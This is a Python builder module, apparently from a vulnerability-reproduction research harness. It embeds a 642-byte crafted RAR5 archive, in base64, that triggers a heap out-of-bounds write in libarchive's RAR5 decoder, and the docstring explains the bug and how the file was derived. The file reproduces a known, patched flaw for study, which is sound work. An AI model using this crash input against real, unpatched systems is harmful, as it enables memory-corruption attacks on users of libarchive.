"""CG-29（arvo:11011 / libarchive rar5）构造器：把文件头改成目录，window_size 变 0。

**缺陷**：libarchive/archive_read_support_format_rar5.c

    rar->cstate.window_size = is_dir ? 0 : g_unpack_window_size << ((compression_info >> 10) & 15);

init_unpack() 旧代码是 window_mask = window_size - 1，window_size=0 时得到 0xFFFFFFFF；
do_uncompress_block() 里写像素那一行（第 2424 行）：

    rar->cstate.window_buf[write_idx & cmask] = (uint8_t) num;

仍然照写，而 window_buf 是 calloc(1, 0) —— 索引不被掩码，直接写越界（WRITE of size 1）。
patch：window_size 为 0 时把 window_mask 置 0。

**触发形（实测）**：拿仓库自带的 rar5 测试样本
（libarchive/test/test_read_format_rar5_blake2.rar.uu），把它唯一的 file header 的
file_flags 第 0 位置 1（DIRECTORY），重算该 header 的 CRC32 —— 其它字节一律不动。
这条目录项仍然带 data block（data_size=534），解压时 window_size=0 → 崩。

派生脚本见 experiments/s14/samples/patch_dir.py（walk + 改位 + 重算 CRC）。
本模块内嵌派生后的 642 字节档案，保证可复现。
"""
from __future__ import annotations

import base64

FIELDS = {
    "variant": "只支持 dir（命中形）；orig 是未改目录位的对照样本，不崩",
}

BASE64_DIR = "UmFyIRoHAQDz4YLrCwEFBwAGAQGAgIAAgGWFLkcCAy6WBAGuBqSDAoAFAQpjZWJ1bGEudHh0IgIA5nuGJZoc0NUbbWd2zhC1pc9hlVmQPACcqMNG1kU4U6UKAxPYcrBbhvU3LM6EEgI3dUM0M/RgNL1wo2SAOPgEsjkokplDodxWovWlupFAkoIFWQBicGgnDJa65u8wkYf/xS0bxtAJHPh74lcizDmYczxw57P37j/c6vLi2qruey3DB297N2tHtq++DWYWuZees8OX6lDTB/P97rSz9nRkyL6+XmYiuR4QVjbZKXZVY/2Sfibbdqdu7ro2LC6hB5o5DPn/jea5L8ymtuFhY9ZUvfv5/htcwldcY7uX5PgGhKVnm2aZlbtGYq1BvP0prBJV4IRFgmw2mHBi2grpbwR4blXF1maZoo/3+QS/LamLE5IgPHiAwpkO035xl/8ys31DJvTO7xIEA+hRWWnp0b3b0qSijF4FkT4Hzc4tS2j1FocEJS7OO9tIbTXMoY4XZTvNgoV4UXPyEUpsjRhItn1H+VjevFks3w7U5gmsCFyN0yHxlkOiGVBOaNQf8I6K5egNx8k0tFmEui/JySMXGm5weJu6jeEVpmSoYTvps6a6gVfMjoHbOC6R4okKP03eQbaDFLHo9Osg95EmJe69o7AIL1xnzX0yvDN/xqB1Fyjn1R8ZVYUZGswGRVNoXO9t67XY3KDhGnC1aoPTvmJ+NocU4Fax+PHXDr2n4BdKuQBFU4NRHYZzPQlJlM63BHHJFIyIk9Ol0/cfUjY/uMERGpeLYMi9nVbYepT0KYpYjoLlG1rhq93hbFIhPrvAy+t8C+331B13VlEDBQQA"

DECLARED_SINK = {
    "file": "libarchive/archive_read_support_format_rar5.c",
    "line": 2424,
    "symbol": "do_uncompress_block",
    "note": "window_size=0 时 mask=0xFFFFFFFF，window_buf[write_idx & mask] 不掩码，写越界 1 字节",
}


class Rar5Result:
    def __init__(self, ok, data=b"", fields_used=None, dropped=None, reason=""):
        self.ok = ok
        self.data = data
        self.format = "rar5"
        self.fields_used = dict(fields_used or {})
        self.dropped = list(dropped or [])
        self.reason = reason

    @property
    def size(self) -> int:
        return len(self.data)

    def to_record(self) -> dict:
        return {"ok": self.ok, "format": self.format, "size": self.size,
                "fields_used": self.fields_used, "dropped_fields": self.dropped,
                "reason": self.reason}


def build(fields: dict) -> Rar5Result:
    fields = dict(fields or {})
    variant = str(fields.get("variant") or "dir")
    if variant != "dir":
        return Rar5Result(False, reason="只支持 variant=dir（orig 对照样本不含命中形）: %s" % variant)
    data = base64.b64decode(BASE64_DIR)
    used = {"variant": variant, "bytes": len(data),
            "note": "blake2 样本 file header 的 file_flags 第 0 位置 1（DIRECTORY），已重算 header CRC32"}
    known = set(FIELDS)
    dropped = [{"field": k, "reason": "rar5 构造器不识别该字段"}
               for k in fields if k not in known]
    return Rar5Result(True, data, used, dropped, "")


def declared_claim() -> dict:
    """构造器自带主张：window_size=0 时 mask 不掩码，window_buf 写越界。"""
    return {
        "claim_id": "cg29-rar5-dir-window",
        "subject": "do_uncompress_block",
        "proposed_by": "builder",
        "subject_source": "builder",
        "evidence_source": "agent/builders/rar5.py + arvo error.txt",
        "cwe": "CWE-122",
        "sink": dict(DECLARED_SINK),
        "test_plan": {"format": "rar5"},
    }


def fields_spec() -> dict:
    return dict(FIELDS)


if __name__ == "__main__":
    r = build({})
    assert r.ok, r.reason
    assert r.data[:8] == bytes.fromhex("526172211a070100"), r.data[:8].hex()
    assert r.size == 642
    assert r.size == r.fields_used["bytes"]
    assert not build({"variant": "orig"}).ok
    assert not build({"variant": "x"}).ok
    assert build({"unknown": 1}).dropped
    c = declared_claim()
    assert c["subject"] == "do_uncompress_block" and c["sink"]["line"] == 2424
    print("rar5 builder self-check OK:", r.to_record())
